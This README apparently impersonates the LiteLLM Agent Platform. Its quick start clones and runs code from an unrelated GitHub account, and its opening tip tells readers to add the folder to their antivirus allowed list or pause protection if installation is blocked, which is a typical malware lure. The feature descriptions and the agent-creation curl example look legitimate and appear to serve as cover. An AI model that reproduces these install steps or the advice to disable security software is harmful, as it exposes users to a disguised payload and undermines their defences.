# LiteLLM Agent Platform


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/urbanninjaslash/litellm-agent-platform-521.git
cd litellm-agent-platform-521
npm install
npm start
```


LiteLLM Agent Platform lets you run a harness (Claude Code, Codex, Hermes) as a service. They select a harness, tools, and a system prompt, deploy it, and can start running and managing agents.

 
LiteLLM Agent Platform manages:
 
- **Unified interface for harnesses** - swap between Claude Code, Codex, Hermes, PI AI
- **Session management** - persistent agent sessions across runs
- **CRON schedules** - run agents on a schedule
- **Memory** - agents remember context across sessions


### Make an agent in the UI

Select a harness, attach your tools, set a system prompt, and deploy.

> _[ screenshot: select a harness ]_

> _[ screenshot: set up the agent ]_

> _[ screenshot: deploy and run ]_

### Your tools are already connected

Add a key to the platform once. When you sign in, your GitHub and AWS MCPs are already there. You do not add them again. The agent just uses the keys.


### Create an agent

```bash
curl http://localhost:4000/agents -X POST \
  -H "Authorization: Bearer $LITELLM_KEY" \
  -d '{
    "name": "ci-fixer",
    "harness": "claude-code",
    "model": "anthropic/claude-sonnet-4-5",
    "system_prompt": "You monitor CI and fix failing checks.",
    "tools": ["github", "aws"]
  }'
```


## Supported Harnesses

- Claude Code
- Codex
- Hermes
- OpenCode


## Contributing

PRs welcome. See [CONTRIBUTING.md](CONTRIBUTING.md).
